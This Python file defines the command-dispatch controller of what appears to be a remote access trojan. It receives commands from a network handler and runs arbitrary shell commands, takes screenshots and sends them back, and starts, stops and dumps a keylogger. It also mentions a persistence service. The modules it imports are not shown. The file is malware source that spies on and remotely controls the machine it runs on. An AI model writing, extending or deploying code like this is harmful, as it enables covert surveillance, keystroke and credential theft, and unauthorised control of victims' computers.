import threading
from queue import Queue, Empty
import os
import queue

from agent.network_handler import AgentNetworkHandler
# Import the new services we just created
from agent.services.command_service import CommandService
from agent.services.keylogger_service import KeyloggerService
# Note: PersistenceService is not used by the controller directly, but could be in the future.

class AgentController:
    def __init__(self):
        self.send_queue = Queue()
        self.receive_queue = Queue()
        
        self.network_handler = AgentNetworkHandler(self.send_queue, self.receive_queue)
        self.shutdown_event = threading.Event()
        
        # --- Service Initialization ---
        # The controller now owns instances of the services
        self.command_service = CommandService()
        # The keylogger needs a way to send async messages back to this controller's inbox
        self.keylogger_service = KeyloggerService(self.receive_queue)

    def process_incoming_commands(self):
        print("[Controller] Started and waiting for commands.")
        while not self.shutdown_event.is_set():
            # --- FIX: Initialize token to None at the start of each loop iteration ---
            # This guarantees the variable always exists.
            token = None 
            try:
                server_message = self.receive_queue.get(timeout=1)
                
                if server_message.get("source") == "internal":
                    self.send_queue.put(server_message)
                    continue

                if not isinstance(server_message, dict) or 'command' not in server_message:
                    continue

                command = server_message.get('command')
                token = server_message.get('token') # 'token' is now being assigned
                args = server_message.get('args', [])
                
                print(f"[Controller] Received command '{command}' with token '{token}'.")

                if command == 'cmd':
                    full_command = " ".join(args)
                    if not full_command:
                        self.send_response(token, "ERR", "No command provided for 'cmd'.")
                        continue
                    result = self.command_service.execute_shell_command(full_command)
                    self.send_response(token, "RSP", result)
                
                elif command == 'screenshot':
                    filepath, error = self.command_service.take_screenshot()
                    if error:
                        self.send_response(token, "ERR", error)
                    else:
                        self.send_status(token, f"Screenshot saved to {filepath}. Preparing to send.")
                        self.send_file_response(token, filepath)

                elif command == 'keylog_start':
                    result = self.keylogger_service.start(token)
                    self.send_response(token, "RSP", result)

                elif command == 'keylog_stop':
                    status = self.keylogger_service.stop(token)
                    self.send_status(token, status)

                elif command == 'dump_keys':
                    status = self.keylogger_service.dump(token)
                    self.send_status(token, status)
                
                elif command == 'keylog_status':
                    status = self.keylogger_service.get_status()
                    self.send_response(token, "RSP", status)

                else:
                    self.send_response(token, "ERR", f"Unknown command: '{command}'")

                self.receive_queue.task_done()
            
            except queue.Empty:
                continue
            except Exception as e:
                print(f"[Controller] CRITICAL ERROR in command loop: {e}")
                # --- FIX: Only send a response if we have a valid token ---
                # This prevents sending a response for a command we couldn't even parse.
                if token:
                    self.send_response(token, "ERR", f"Agent-side exception: {type(e).__name__}")

    # --- Helper methods to construct response messages ---
    def send_response(self, token, response_type, payload):
        self.send_queue.put({"token": token, "type": response_type, "payload": payload})

    def send_status(self, token, message):
        self.send_queue.put({"token": token, "type": "STS", "payload": message})

    def send_file_response(self, token, filepath):
        # This is a special message type that the network handler will intercept
        self.send_queue.put({"type": "FILE", "token": token, "filepath": filepath})

    def start(self):
        network_thread = threading.Thread(target=self.network_handler.start, daemon=True)
        network_thread.start()
        self.process_incoming_commands()

    def stop(self):
        print("[Controller] Shutdown signal received.")
        self.shutdown_event.set()
        self.network_handler.stop()